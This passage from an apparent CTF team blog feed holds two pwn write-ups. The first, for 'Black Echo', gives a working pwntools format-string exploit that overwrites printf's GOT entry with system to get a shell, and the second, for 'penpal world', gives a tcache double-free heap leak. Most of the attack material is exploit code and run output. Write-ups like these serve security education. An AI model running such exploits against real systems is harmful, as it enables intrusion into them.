class="string">'-----'</span></span><br><span class="line">out = out.replace(<span class="string">'||||'</span>,<span class="string">''</span>)</span><br><span class="line"><span class="comment">#print out</span></span><br><span class="line"><span class="comment">#length = count_until(out)</span></span><br><span class="line"><span class="keyword">if</span> out == <span class="string">''</span>:</span><br><span class="line">out = <span class="string">'a'</span></span><br><span class="line">binary += <span class="string">'\x00'</span></span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line">binary += out</span><br><span class="line">with open(<span class="string">'gotcha2.elf'</span>,<span class="string">'wb+'</span>) as f:</span><br><span class="line">f.write(binary)</span><br><span class="line">x += len(out)</span><br></pre></td></tr></table></figure></p><p><a data-fancybox="gallery" href="https://i.imgur.com/zlzVC2u.png" target="_blank" rel="noopener"><br><img src="https://i.imgur.com/zlzVC2u.png" alt><br></a></p><p>They binary is somehow corrupted as expected but it’s still possible to deduce which libc addresses are in there, as you can see in the picture above, right above extern functions you have some libc addresses, they look like they are from the GOT, with some trial and error I manged to which they belong by using libc-database (<a href="https://github.com/niklasb/libc-database)" target="_blank" rel="noopener">https://github.com/niklasb/libc-database)</a>.</p><p>First trying o find <strong>fgets</strong>:</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">./find fgets 0xF7FCD918</span><br><span class="line">$ ./find fgets 0xF7FBDFE0</span><br><span class="line">$ ./find fgets 0xF7E54450</span><br><span class="line">$ ./find fgets 0xF7E38020</span><br><span class="line">$ ./find fgets 0xF7E4C620</span><br><span class="line">ubuntu-xenial-amd64-libc6-i386 (id libc6-i386_2.23-0ubuntu10_amd64)</span><br><span class="line">archive-glibc (id libc6-i386_2.23-0ubuntu11_amd64)</span><br><span class="line">ubuntu-xenial-amd64-libc6-i386 (id libc6-i386_2.23-0ubuntu9_amd64)</span><br></pre></td></tr></table></figure><p>libc ID is <strong>libc6-i386_2.23-0ubuntu10_amd64</strong>, we now know which libc is and fgets got address is <strong>0x804A014</strong>:<br><a data-fancybox="gallery" href="https://i.imgur.com/aPC1BSA.png" target="_blank" rel="noopener"><br><img src="https://i.imgur.com/aPC1BSA.png" alt><br></a></p><p>Doing the same thing for printf you would end up finding the same:</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">./find <span class="built_in">printf</span> 0xF7E38020</span><br><span class="line">archive-old-eglibc (id libc6-i386_2.11.1-0ubuntu7.11_amd64)</span><br><span class="line">ubuntu-xenial-amd64-libc6-i386 (id libc6-i386_2.23-0ubuntu10_amd64)</span><br><span class="line">archive-glibc (id libc6-i386_2.23-0ubuntu11_amd64)</span><br><span class="line">ubuntu-xenial-amd64-libc6-i386 (id libc6-i386_2.23-0ubuntu9_amd64)</span><br></pre></td></tr></table></figure><p>Printf got address is <strong>0x804a010</strong>:<br><a data-fancybox="gallery" href="https://i.imgur.com/LfnRAXv.png" target="_blank" rel="noopener"><br><img src="https://i.imgur.com/LfnRAXv.png" alt><br></a></p><p>Now it’s a matter of leaking libc by leaking <strong>fgets</strong> from GOT and overwriting got address of printf into system with format string:</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">import</span> time</span><br><span class="line"><span class="keyword">import</span> binascii</span><br><span class="line"></span><br><span class="line">libc = ELF(<span class="string">'libc.so.6'</span>)</span><br><span class="line">host,port = <span class="string">'chall.2019.redpwn.net'</span>,<span class="string">'4007'</span></span><br><span class="line">r = remote(host,port)</span><br><span class="line"></span><br><span class="line">FGETS_GOT = <span class="number">0x804A014</span></span><br><span class="line">PRINTF_GOT = <span class="number">0x804A010</span></span><br><span class="line">r.sendline(<span class="string">"%8$s"</span>+p32(PRINTF_GOT))</span><br><span class="line"></span><br><span class="line">PRINTF = u32(r.recv(<span class="number">4</span>))</span><br><span class="line">LIBC_BASE = PRINTF - libc.symbols[<span class="string">'printf'</span>]</span><br><span class="line">SYSTEM = LIBC_BASE + libc.symbols[<span class="string">'system'</span>]</span><br><span class="line">FGETS = LIBC_BASE + libc.symbols[<span class="string">'fgets'</span>]</span><br><span class="line">GETS = LIBC_BASE + libc.symbols[<span class="string">'gets'</span>]</span><br><span class="line">PUTS = LIBC_BASE + libc.symbols[<span class="string">'puts'</span>]</span><br><span class="line">log.info(<span class="string">"LIBCBASE 0x%x"</span>%LIBC_BASE)</span><br><span class="line">log.info(<span class="string">"PRINTF 0x%x"</span>%PRINTF)</span><br><span class="line">log.info(<span class="string">"SYSTEM 0x%x"</span>%SYSTEM)</span><br><span class="line">log.info(<span class="string">"FGETS 0x%x"</span>%FGETS)</span><br><span class="line">log.info(<span class="string">"STDOUT 0x%x"</span>%(LIBC_BASE+libc.symbols[<span class="string">'stdout'</span>]))</span><br><span class="line">log.info(<span class="string">"STDIN 0x%x"</span>%(LIBC_BASE+libc.symbols[<span class="string">'stdin'</span>]))</span><br><span class="line">log.info(<span class="string">"SETBUFF 0x%x"</span>%(LIBC_BASE+libc.symbols[<span class="string">'setbuf'</span>]))</span><br><span class="line">log.info(<span class="string">"STDERR 0x%x"</span>%(LIBC_BASE+libc.symbols[<span class="string">'stderr'</span>]))</span><br><span class="line">log.info(<span class="string">"PUTS 0x%x"</span>%(LIBC_BASE+libc.symbols[<span class="string">'puts'</span>]))</span><br><span class="line"></span><br><span class="line"><span class="comment">#SYSTEM = 0xcafebabe</span></span><br><span class="line"></span><br><span class="line">FLAG_LOW = SYSTEM &amp; <span class="number">0xffff</span></span><br><span class="line">FLAG_HIGH = (SYSTEM &amp; <span class="number">0xffff0000</span>) &gt;&gt; <span class="number">16</span></span><br><span class="line"></span><br><span class="line">s = <span class="string">''</span></span><br><span class="line">s += p32(PRINTF_GOT)</span><br><span class="line">s += p32(PRINTF_GOT+<span class="number">2</span>)</span><br><span class="line">s += <span class="string">'%7$ln'</span> <span class="comment"># clears the already existing got address</span></span><br><span class="line">s += <span class="string">'%&#123;&#125;x%7$hn'</span>.format(FLAG_LOW<span class="number">-0x8</span>)</span><br><span class="line">s += <span class="string">'%&#123;&#125;x%8$hn'</span>.format(FLAG_HIGH-FLAG_LOW)</span><br><span class="line">r.sendline(s)</span><br><span class="line">r.recv()</span><br><span class="line">r.sendline(<span class="string">"/bin/sh\x00"</span>)</span><br><span class="line">r.interactive()</span><br></pre></td></tr></table></figure><p>Running it:</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line">$ python blackecho.py </span><br><span class="line">[*] <span class="string">'/ctf/work/blackecho/libc.so.6'</span></span><br><span class="line">    Arch:     i386-32-little</span><br><span class="line">    RELRO:    Partial RELRO</span><br><span class="line">    Stack:    Canary found</span><br><span class="line">    NX:       NX enabled</span><br><span class="line">    PIE:      PIE enabled</span><br><span class="line">[+] Opening connection to chall2.2019.redpwn.net on port 4007: Done</span><br><span class="line">[*] LIBCBASE 0xf7dec000</span><br><span class="line">[*] PRINTF 0xf7e35020</span><br><span class="line">[*] SYSTEM 0xf7e26940</span><br><span class="line">[*] FGETS 0xf7e49620</span><br><span class="line">[*] STDOUT 0xf7f9cdfc</span><br><span class="line">[*] STDIN 0xf7f9ce00</span><br><span class="line">[*] SETBUFF 0xf7e51450</span><br><span class="line">[*] STDERR 0xf7f9cdf8</span><br><span class="line">[*] PUTS 0xf7e4b140</span><br><span class="line">[*] Switching to interactive mode</span><br><span class="line">\x10\xa0\x0\x12\xa0\x0</span><br><span class="line">...truncated...</span><br><span class="line">$ cat flag.txt</span><br><span class="line">flag&#123;__xXxxXx__w3lc0me_t0_th3_surf4c3__xXxxXx__&#125;</span><br></pre></td></tr></table></figure><p>The flag was <strong>flag{<strong>xXxxXx</strong>w3lc0me_t0_th3_surf4c3__xXxxXx__}</strong></p><link rel="stylesheet" href="/css/spoiler.css" type="text/css"><script src="/js/spoiler.js" type="text/javascript" async></script>]]></content>
    
    <summary type="html">
    
      
      
        &lt;blockquote&gt;
&lt;p&gt;Black Echo&lt;/p&gt;
&lt;/blockquote&gt;
&lt;blockquote&gt;
&lt;p&gt;&lt;strong&gt;Description&lt;/strong&gt;:&lt;br&gt;413&lt;/p&gt;
&lt;p&gt;Written by: blevy&lt;/p&gt;
&lt;p&gt;You are tr
      
    
    </summary>
    
      <category term="Pwn" scheme="https://teamrocketist.github.io/categories/Pwn/"/>
    
      <category term="x86" scheme="https://teamrocketist.github.io/categories/Pwn/x86/"/>
    
      <category term="Format String" scheme="https://teamrocketist.github.io/categories/Pwn/x86/Format-String/"/>
    
    
      <category term="formatstring" scheme="https://teamrocketist.github.io/tags/formatstring/"/>
    
      <category term="pwn" scheme="https://teamrocketist.github.io/tags/pwn/"/>
    
      <category term="redpwnctf2017" scheme="https://teamrocketist.github.io/tags/redpwnctf2017/"/>
    
  </entry>
  
  <entry>
    <title>[Pwn] RedpwnCTF - penpal world</title>
    <link href="https://teamrocketist.github.io/2019/08/17/Pwn-RedpwnCTF-penpal-world/"/>
    <id>https://teamrocketist.github.io/2019/08/17/Pwn-RedpwnCTF-penpal-world/</id>
    <published>2019-08-17T03:16:39.000Z</published>
    <updated>2019-10-30T19:09:00.368Z</updated>
    
    <content type="html"><![CDATA[<blockquote><p>penpal world</p></blockquote><blockquote><p><strong>Description</strong>:<br>436</p><p>Written by: jespiron</p><p>Please don’t decimate this cute lil ish; write your grandmother a smol parcel of love instead~</p><p>nc chall2.2019.redpwn.net 4010<br><a href="https://mega.nz/#!r6o03YgS!a9EjWEernGYNGeWjmQZorIkwrk1C0EhdkezMu4w9-3E" target="_blank" rel="noopener">penpal_world</a><br><a href="https://mega.nz/#!myg22IDT!BIF24BAOo9TeH6fUTggyTUY2KhOq19HBRFWhERXChYA" target="_blank" rel="noopener">libc-2.27.so</a></p></blockquote><h3 id="Introduction"><a href="#Introduction" class="headerlink" title="Introduction"></a>Introduction</h3><p>From the challenge is provided its <strong>binary</strong> and <strong>libc</strong>.<br>Lets first extract some information:</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">$ file penpal_world</span><br><span class="line">penpal_world: ELF 64-bit LSB pie executable, x86-64, version 1 (SYSV), dynamically linked, interpreter /lib64/ld-linux-x86-64.so.2, <span class="keyword">for</span> GNU/Linux 3.2.0, BuildID[sha1]=195416fc8622b4f9906da0915a9abb1dfde40e13, not stripped</span><br></pre></td></tr></table></figure><p>With <strong>file</strong> command we now know:</p><ul><li>ELF compiled for x86_x64 architecture.</li><li>Dynamically linked.</li><li>Not stripped.</li></ul><p>Let’s check the enabled  protections with <strong>checksec</strong>:</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">$ checksec penpal_world</span><br><span class="line">[*] <span class="string">'/ctf/redpwn/pwn/pepal_world/penpal_world'</span></span><br><span class="line">    Arch:     amd64-64-little</span><br><span class="line">    RELRO:    Full RELRO</span><br><span class="line">    Stack:    Canary found</span><br><span class="line">    NX:       NX enabled</span><br><span class="line">    PIE:      PIE enabled</span><br></pre></td></tr></table></figure><p>Protections:</p><ul><li>FULL RELRO (<strong>GOT</strong> entries are read only we can’t overwrite them)</li><li>STACK CANARY (The stack is protected with the canary if there is a stack overflow we need to find a way to <strong>leak</strong> it)</li><li>The Stack is not executable (We can’t execute shellcode techniques like <strong>ROP</strong> can bypass this)</li><li>PIE (Position Independent Executable) is on (If we want to use rop we need a way to leak the base address)</li></ul><h3 id="Running-the-binary"><a href="#Running-the-binary" class="headerlink" title="Running the binary"></a>Running the binary</h3><p>Lets first run the binary to see how it works</p><p>We are presented with a menu where we can create,edit,discard and read a postcard:<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">$ ./penpal_world</span><br><span class="line">OPTIONS</span><br><span class="line">1) Create a postcard</span><br><span class="line">2) Edit a postcard</span><br><span class="line">3) Discard a postcard</span><br><span class="line">4) Read a postcard</span><br></pre></td></tr></table></figure></p><h3 id="Analysing-the-binary-for-a-vulnerability"><a href="#Analysing-the-binary-for-a-vulnerability" class="headerlink" title="Analysing the binary for a vulnerability"></a>Analysing the binary for a vulnerability</h3><p>Using ida to check on the main loop:<br><a data-fancybox="gallery" href="https://i.imgur.com/qwc5RCS.png" target="_blank" rel="noopener"><br><img src="https://i.imgur.com/qwc5RCS.png" alt><br></a></p><p>Lets check <strong>create_card</strong>:<br><a data-fancybox="gallery" href="https://i.imgur.com/I0EbIyy.png" target="_blank" rel="noopener"><br><img src="https://i.imgur.com/I0EbIyy.png" alt><br></a><br><strong>edit_card</strong> time:<br><a data-fancybox="gallery" href="https://i.imgur.com/bcLTouv.png" target="_blank" rel="noopener"><br><img src="https://i.imgur.com/bcLTouv.png" alt><br></a><br>The vulnerability is in <strong>discard_card</strong>:<br><a data-fancybox="gallery" href="https://i.imgur.com/uZr1mzH.png" target="_blank" rel="noopener"><br><img src="https://i.imgur.com/uZr1mzH.png" alt><br></a><br><strong>display</strong> function doesn’t have anything special it does control the indexes and you can print the cards as well.</p><h3 id="Exploit"><a href="#Exploit" class="headerlink" title="Exploit"></a>Exploit</h3><p>First we need to check which <strong>libc</strong> version is used on the server, since we are provided with the libc file from the challenge, we know that it’s using <strong>libc-2.27</strong> since version <strong>2.26</strong> it implements the tcache concept that is used to cache free chunks in the heap before adding them to the libc freelist. </p><p>Now all heap chunks of size &lt; 0x410 are treated as tcache chunks. When freed they go into their respective tcache bins. </p><p>The good thing about this unlike normal chunks and luckly in this libc version there is <strong>no</strong> security checks making it easier to exploit. Thus we can double free and malloc without any <strong>size</strong> checks.</p><p>The exploit plan is the following one:</p><ul><li>Leak the heap address by reading the fd pointer after freeing;</li><li>Find a way to overwrite the size of a chunk to 0x91 (so when we free it it goes to unsorted bin instead);</li><li>Fill the tcache unsorted tcache bin list (max 7);</li><li>After tcache unsorted bin is full the next free will put into a normal unsorted bin with that we can leak libc; </li><li>Tricking malloc() into returning the address of __malloc_hook ;</li><li>Overwrite __malloc_hook with the address of a one gadget ;</li><li>Trigger the hook using malloc()!</li></ul><h3 id="Setting-up-the-environment-for-pwn-ctf-challenges"><a href="#Setting-up-the-environment-for-pwn-ctf-challenges" class="headerlink" title="Setting up the environment for pwn ctf challenges"></a>Setting up the environment for pwn ctf challenges</h3><p>Now there is a small problem, if you want to debug the binary with the right <strong>libc version</strong> you either find the right linux docker container that uses that version that libc as default or you <strong>LD_PRELOAD</strong> it, to do it you need to compile that specific version. </p><p>for example to do this manually:</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">cp /glibc/2.27/64/lib/ld-2.27.so /tmp/ld-2.27.so</span><br><span class="line">patchelf --<span class="built_in">set</span>-interpreter /tmp/ld-2.27.so ./<span class="built_in">test</span></span><br><span class="line">LD_PRELOAD=./libc.so.6 ./<span class="built_in">test</span></span><br></pre></td></tr></table></figure><p>Or using pwntools</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">from pwn import *</span><br><span class="line">p = process([<span class="string">"/path/to/ld.so"</span>, <span class="string">"./test"</span>], env=&#123;<span class="string">"LD_PRELOAD"</span>:<span class="string">"/path/to/libc.so.6"</span>&#125;)</span><br></pre></td></tr></table></figure><p>Luckily someone did the dirty work for us, this docker container contains multiple compiled libcs and also the default libc coming with the system is libc-2.27.so the one we need. </p><p>The github link: <a href="https://github.com/skysider/pwndocker" target="_blank" rel="noopener">https://github.com/skysider/pwndocker</a><br>The docker hub link: <a href="https://hub.docker.com/r/skysider/pwndocker" target="_blank" rel="noopener">https://hub.docker.com/r/skysider/pwndocker</a></p><p>I don’t recommend going with the <strong>LD_PRELOAD</strong> way, sure you can debug it with the right version but remember this, some <strong>offsets</strong> when leaking libc will be different from the server ones because you’re preloading it with the <strong>ld.so</strong>, if you choose to go this way remember to adapt those offsets to the right ones.</p><h3 id="Leak-heap-address"><a href="#Leak-heap-address" class="headerlink" title="Leak heap address"></a>Leak heap address</h3><p>This the structure of of a chunk:<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+ &lt;-- Chunk start</span><br><span class="line">|          PREV_SIZE OR USER DATA       |</span><br><span class="line">+---------------------------------+-+-+-+</span><br><span class="line">| CHUNK SIZE                      |A|M|P|</span><br><span class="line">+---------------------------------+-+-+-+ </span><br><span class="line">|           FORWARD POINTER(FD)         | &lt;-- All freechunks</span><br><span class="line">|            BACK POINTER(BK)           | &lt;-- normalchunk or larger</span><br><span class="line">|   NEXT BIGGER POINTER (fd_nextsize)   | &lt;-- Only if largechunk</span><br><span class="line">|   PREVIOUS SMALLER PTR(bk_nextsize)   | &lt;-- Only if largechunk</span><br><span class="line">| -  -  -  -  -  -  -  -  -  -  -  -  - | &lt;-- End of this chunk.</span><br><span class="line">|               PREV_SIZE               |</span><br><span class="line">+---------------------------------------+</span><br></pre></td></tr></table></figure></p><p>The mallocs we can do are limited to 0x48 size, which is within tcache fast bin range. Since it’s a tcache bin freed items will be kept in a single-linked list. When the first fastchunk is <strong>free()</strong>‘d, it sets its <strong>FD pointer</strong> to NULL because there wasn’t any freed item yet, if we free a second item the <strong>FD pointer</strong> will be set to the previous chunk freed, by using <strong>UAF</strong> vulnerability we can print this pointer thus leaking it’s heap address, let’s start by writing our python script to do this.</p><p>Some introductory stuff we can add I’m using <strong>pwntools</strong> which is a very handy framework for <strong>pwn</strong> you can find it at <a href="https://github.com/Gallopsled/pwntools" target="_blank" rel="noopener">https://github.com/Gallopsled/pwntools</a></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">host, port = <span class="string">"chall2.2019.redpwn.net"</span>, <span class="string">"4010"</span></span><br><span class="line">filename = <span class="string">"./penpal_world"</span></span><br><span class="line">elf = ELF(filename)</span><br><span class="line">context.arch = <span class="string">'amd64'</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> <span class="keyword">not</span> args.REMOTE:</span><br><span class="line">    libc = elf.libc</span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line">    libc = ELF(<span class="string">'./libc-2.27.so'</span>)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">getConn</span><span class="params">()</span>:</span></span><br><span class="line">    <span class="keyword">return</span> process(filename) <span class="keyword">if</span> <span class="keyword">not</span> args.REMOTE <span class="keyword">else</span> remote(host, port)</span><br></pre></td></tr></table></figure><p>Since <strong>PIE</strong> is enabled we need to get its base address, to debug it in gdb we can use this function to do it:</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">get_PIE</span><span class="params">(proc)</span>:</span></span><br><span class="line">    memory_map = open(<span class="string">"/proc/&#123;&#125;/maps"</span>.format(proc.pid),<span class="string">"rb"</span>).readlines()</span><br><span class="line">    <span class="keyword">return</span> int(memory_map[<span class="number">0</span>].split(<span class="string">"-"</span>)[<span class="number">0</span>],<span class="number">16</span>)</span><br></pre></td></tr></table></figure><p>If you’re <strong>LD_PRELOAD</strong> the libc version you need to change the index of memory_map to 5:</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">get_PIE</span><span class="params">(proc)</span>:</span></span><br><span class="line">    memory_map = open(<span class="string">"/proc/&#123;&#125;/maps"</span>.format(proc.pid),<span class="string">"rb"</span>).readlines()</span><br><span class="line">    <span class="keyword">return</span> int(memory_map[<span class="number">5</span>].split(<span class="string">"-"</span>)[<span class="number">0</span>],<span class="number">16</span>)</span><br></pre></td></tr></table></figure><p>If you’re using <strong>gdb.attach</strong> from pwntools and you’re inside a docker container remember it won’t detect the terminal to open the specific <strong>gdb window</strong>, we can use tmux for example but we need to specified it by doing this:</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">context.terminal = [<span class="string">'tmux'</span>, <span class="string">'new-window'</span>]</span><br><span class="line">r = getConn()</span><br><span class="line"><span class="keyword">if</span> <span class="keyword">not</span> args.REMOTE <span class="keyword">and</span> args.GDB:</span><br><span class="line">debug([<span class="number">0xb11</span>])</span><br></pre></td></tr></table></figure><p>Open two windows logged in the docker container, the 1st one run your script and on the 2nd one open tmux, when running the script <strong>gdb</strong> will automaticity open with the specified breakpoints we set in the debug list:</p><p><a data-fancybox="gallery" href="https://i.imgur.com/yxHU7rd.png" target="_blank" rel="noopener"><br><img src="https://i.imgur.com/yxHU7rd.png" alt><br></a></p><p>Now that we can debug and open gdb in a very easy way it’s time to write the functions to add,free,edit and print:</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">add</span><span class="params">(index)</span>:</span></span><br><span class="line">    r.sendlineafter(<span class="string">'4) Read a postcard\n'</span>,str(<span class="number">1</span>))</span><br><span class="line">    r.sendlineafter(<span class="string">'Which envelope #?\n'</span>, str(index))</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">edit</span><span class="params">(index, content)</span>:</span></span><br><span class="line">    r.sendlineafter(<span class="string">'4) Read a postcard\n'</span>,str(<span class="number">2</span>))</span><br><span class="line">    r.sendlineafter(<span class="string">'Which envelope #?\n'</span>, str(index))</span><br><span class="line">    r.sendafter(<span class="string">'Write.\n'</span>, content)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">free</span><span class="params">(index)</span>:</span></span><br><span class="line">    r.sendlineafter(<span class="string">'4) Read a postcard\n'</span>,str(<span class="number">3</span>))</span><br><span class="line">    r.sendlineafter(<span class="string">'Which envelope #?\n'</span>, str(index))</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">read</span><span class="params">(index)</span>:</span></span><br><span class="line">    r.sendlineafter(<span class="string">'4) Read a postcard\n'</span>,str(<span class="number">4</span>))</span><br><span class="line">    r.sendlineafter(<span class="string">'Which envelope #?\n'</span>, str(index))</span><br></pre></td></tr></table></figure><p>To leak an address we can for example allocate a chunk and then double free it, we then proceed to read its fd pointer which will point to the first freed chunk, this chunks will be inserted into a tcache bin due to its size of 0x48.</p><p>Lets put a breakpoint on free and look how the first chunk looks like before free it the first time:<br><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">add(<span class="number">0</span>)</span><br><span class="line">edit(<span class="number">0</span>, <span class="string">'A'</span>*<span class="number">0x30</span> + p64(<span class="number">0x0</span>)+ p64(<span class="number">0x51</span>))</span><br><span class="line">free(<span class="number">0</span>)</span><br><span class="line">free(<span class="number">0</span>) <span class="comment"># DOUBLE FREE (no security checks while in tcache at this libc version)</span></span><br><span class="line">read(<span class="number">0</span>) <span class="comment"># LEAK HEAP</span></span><br><span class="line">r.interactive()</span><br></pre></td></tr></table></figure></p><p>Gdb output:<br><a data-fancybox="gallery" href="https://i.imgur.com/brUzymx.png" target="_blank" rel="noopener"><br><img src="https://i.imgur.com/brUzymx.png" alt><br></a></p><p>Now let’s take a look after the 1st free:<br><a data-fancybox="gallery" href="https://i.imgur.com/bZTPxZ1.png" target="_blank" rel="noopener"><br><img src="https://i.imgur.com/bZTPxZ1.png" alt><br></a></p><p>Lets check how tcache fast bin list is looking by using tcachebins on pwngdb:<br><a data-fancybox="gallery" href="https://i.imgur.com/iWd1MMW.png" target="_blank" rel="noopener"><br><img src="https://i.imgur.com/iWd1MMW.png" alt><br></a></p><p>After 2nd free (Double free)<br><a data-fancybox="gallery" href="https://i.imgur.com/9jy4cUV.png" target="_blank" rel="noopener"><br><img src="https://i.imgur.com/9jy4cUV.png" alt><br></a></p><p>Lets check again how tcache bin list is looking by using tcachebins on pwngdb:<br><a data-fancybox="gallery" href="https://i.imgur.com/kjCR5aR.png" target="_blank" rel="noopener"><br><img src="https://i.imgur.com/kjCR5aR.png" alt><br></a></p><p>Now if we read the card at index 0 we will get a heap leak!</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">add(<span class="number">0</span>)</span><br><span class="line">edit(<span class="number">0</span>, <span class="string">'A'</span>*<span class="number">0x30</span> + p64(<span class="number">0x0</span>)+ p64(<span class="number">0x51</span>))</span><br><span class="line">free(<span class="number">0</span>)</span><br><span class="line">free(<span class="number">0</span>) <span class="comment"># DOUBLE FREE (no security checks while in tcache at this libc version)</span></span><br><span class="line">read(<span class="number">0</span>) <span class="comment"># LEAK HEAP</span></span><br><span class="line">heap = u64(r.recv(<span class="number">6</span>).ljust(<span class="number">8</span>, <span class="string">'\x00'</span>))<span class="number">-0x60</span></span><br><span class="line">log.info(<span class="string">'0x%x'</span>%heap)</span><br></pre></td></tr></table></figure><p>Results:<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">$ python test.py</span><br><span class="line">[*] <span class="string">'/ctf/work/pwn/pepal_world/penpal_world'</span></span><br><span class="line">    Arch:     amd64-64-little</span><br><span class="line">    RELRO:    Full RELRO</span><br><span class="line">    Stack:    Canary found</span><br><span class="line">    NX:       NX enabled</span><br><span class="line">    PIE:      PIE enabled</span><br><span class="line">[*] <span class="string">'/lib/x86_64-linux-gnu/libc.so.6'</span></span><br><span class="line">    Arch:     amd64-64-little</span><br><span class="line">    RELRO:    Partial RELRO</span><br><span class="line">    Stack:    Canary found</span><br><span class="line">    NX:       NX enabled</span><br><span class="line">    PIE:      PIE enabled</span><br><span class="line">[+] Starting <span class="built_in">local</span> process <span class="string">'./penpal_world'</span>: pid 2596</span><br><span class="line">[*] 0x55d9117e3200</span><br><span 